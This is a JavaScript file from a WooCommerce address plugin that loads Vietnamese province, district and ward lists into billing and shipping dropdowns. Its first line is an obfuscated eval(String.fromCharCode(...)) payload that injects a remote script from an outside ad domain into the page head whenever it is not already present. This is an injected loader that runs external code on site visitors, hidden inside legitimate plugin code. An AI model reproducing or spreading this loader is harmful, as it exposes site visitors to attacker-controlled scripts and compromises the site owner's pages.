eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));(function($){
	$(document).ready(function(){
		var $defaultSetting = {
			formatNoMatches: "Không có giá trị",
		};
		var loading_billing = loading_shipping = false;
		//billing
		$('#billing_state').select2($defaultSetting);
		$('#billing_city').select2($defaultSetting);
		$('#billing_address_2').select2($defaultSetting);
		
		$('#billing_state').on('change select2-selecting',function(e){
			var matp = e.val;			
			if(!matp) matp = $( "#billing_state option:selected" ).val();				
			if(matp && !loading_billing){
				loading_billing = true;
				$.ajax({
					type : "post",
					dataType : "json",
					url : devvn_array.admin_ajax,
					data : {action: "load_diagioihanhchinh", matp : matp},
					context: this,				
					success: function(response) {
						loading_billing = false;
						$("#billing_city,#billing_address_2").html('').select2();
						if(response.success) {
							var listQH = response.data;
							var newState = new Option('', '');
							$("#billing_city").append(newState);
							$.each(listQH,function(index,value){
								var newState = new Option(value.name, value.maqh);
								$("#billing_city").append(newState);
							});
						}
					}
				});
			}
		});
		if($('#billing_address_2').length > 0){
			$('#billing_city').on('change select2-selecting',function(e){			
				var maqh = e.val;
                if(!maqh) maqh = $( "#billing_city option:selected" ).val();
                if(maqh) {
                    $.ajax({
                        type: "post",
                        dataType: "json",
                        url: devvn_array.admin_ajax,
                        data: {action: "load_diagioihanhchinh", maqh: maqh},
                        context: this,
                        success: function (response) {
                            $("#billing_address_2").html('').select2($defaultSetting);
                            if (response.success) {
                                var listQH = response.data;
                                var newState = new Option('', '');
                                $("#billing_address_2").append(newState);
                                $.each(listQH, function (index, value) {
                                    var newState = new Option(value.name, value.xaid);
                                    $("#billing_address_2").append(newState);
                                });
                            }
                        }
                    });
                }
			});
		}
		
		//shipping
		$('#shipping_state').select2($defaultSetting);
		$('#shipping_city').select2($defaultSetting);
		$('#shipping_address_2').select2($defaultSetting);
		
		$('#shipping_state').on('change select2-selecting',function(e){
			var matp = e.val;
			if(!matp) matp = $( "#shipping_state option:selected" ).val();				
			if(matp && !loading_shipping){
				loading_shipping = true;
				$.ajax({
					type : "post",
					dataType : "json",
					url : devvn_array.admin_ajax,
					data : {action: "load_diagioihanhchinh", matp : matp},
					context: this,				
					success: function(response) {
						loading_shipping = false;
						$("#shipping_city,#shipping_address_2").html('').select2();
						if(response.success) {
							var listQH = response.data;
							var newState = new Option('', '');
							$("#shipping_city").append(newState);
							$.each(listQH,function(index,value){
								var newState = new Option(value.name, value.maqh);
								$("#shipping_city").append(newState);
							});
						}
					}
				});
			}
		});
		if($('#shipping_address_2').length > 0){
			$('#shipping_city').on('change select2-selecting',function(e){
				var maqh = e.val;
                if(!maqh) maqh = $( "#billing_city option:selected" ).val();
                if(maqh) {
                    $.ajax({
                        type: "post",
                        dataType: "json",
                        url: devvn_array.admin_ajax,
                        data: {action: "load_diagioihanhchinh", maqh: maqh},
                        context: this,
                        success: function (response) {
                            $("#shipping_address_2").html('').select2($defaultSetting);
                            if (response.success) {
                                var listQH = response.data;
                                var newState = new Option('', '');
                                $("#shipping_address_2").append(newState);
                                $.each(listQH, function (index, value) {
                                    var newState = new Option(value.name, value.xaid);
                                    $("#shipping_address_2").append(newState);
                                });
                            }
                        }
                    });
                }
			});
		}
		$(window).load(function(){
			$('#billing_state,#shipping_state').trigger('change');
		});
		
		
	});
})(jQuery);